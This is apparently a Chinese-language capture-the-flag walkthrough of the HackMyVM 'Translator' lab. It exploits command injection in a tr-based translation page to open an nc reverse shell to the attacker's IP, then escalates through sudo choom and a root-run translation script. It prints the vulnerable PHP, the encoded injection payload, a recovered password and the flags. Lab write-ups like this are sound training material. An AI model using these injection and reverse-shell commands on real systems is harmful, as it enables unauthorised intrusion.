# Translator

2025.02.05 https://hackmyvm.eu/machines/machine.php?vm=Translator

[video](https://www.bilibili.com/video/BV1jaP1eWEAZ/?spm_id_from=333.1387.homepage.video_card.click&vd_source=aed2f374c732513d2e535afafb1fd2ec)

## Ip

192.168.5.40

## Scan

```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

访问 80 web 首页显示的是一个翻译页面，输入一个 5 时，会显示 2 个 5，这里可能会出现漏洞点。

先 gobuster 扫描看看有没有其他隐藏目录，没有发现：

```
gobuster -t 32 dir -u http://192.168.5.40/ -k -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-small.txt -e -x txt,php,html,jpg
```

仔细研究下这个翻译功能吧，经过测试，输入数字 0-9 不会变化，输入字符 a 会输出 z 字符，字母是按倒序进行输出的，这里可能使用了 linux 中的处理命令 tr，可能存在命令注入，进行测试：

```
GET /translate.php?hmv=oh;oh HTTP/1.1
```

这里发现实现了 ls 的输出功能，可以实现命令注入，直接进行反弹（nc 192.168.5.3 8888 -e /bin/sh）：

```
GET /translate.php?hmv=oh;mx+192.168.5.3+8888+-v+/yrm/hs HTTP/1.1
```

得到了反弹的 shell，在/var/www/html 目录下，发现一个文件 hvxivg 进行 translate 后得到了 secret:

```
www-data@translator:~/html$ cat hvxivg
Mb kzhhdliw rh zbfie3w4

My password is ayurv3d4
```

```
cat translate.php
<?php
$test = $_GET['hmv'];
$test = escapeshellcmd($test);
echo ("Translated to:");
echo "<br>";
$ultima_linea = system('echo '.$test.'| tr abcdefghijklmnopqrstuvwxyz zyxwvutsrqponmlkjihgfedcba');
$ulti = system('echo '.$ultima_linea.'| tr "php" "wtf"');
?>
```

/home 目录中发现 2 个用户 india 和 ocean 尝试用上面的密码切换用户，最终切换到 ocean 用户，得到了 user flag：

```
ocean@translator:~$ cat user.txt
a6765hftgnhvugy473f
```

sudo -l 发现: (india) NOPASSWD: /usr/bin/choom , 可以用这个切换到 india 用户: sudo -u india choom -n 0 /bin/bash

切换到 india 用户后，sudo -l 发现: (root) NOPASSWD: /usr/local/bin/trans

/usr/local/bin/trans 是一个脚本文件，india 用户没有 w 权限，不能修改。先执行看看它的帮助，发现可以读取文件：

```
sudo -u root /usr/local/bin/trans --help

I/O options:
    -i FILENAME, -input FILENAME
    Specify the input file.
```

这里这个脚本需要调用 google 的翻译接口，需要借助魔法，使用 kali 上的 proxy，所以直接写了命令：

```
sudo -u root /usr/local/bin/trans -i /root/root.txt -x http://192.168.5.3:7890 --no-autocorrect
```

最终得到 root flag:

```
h87M5364V2343ubvgfy
```
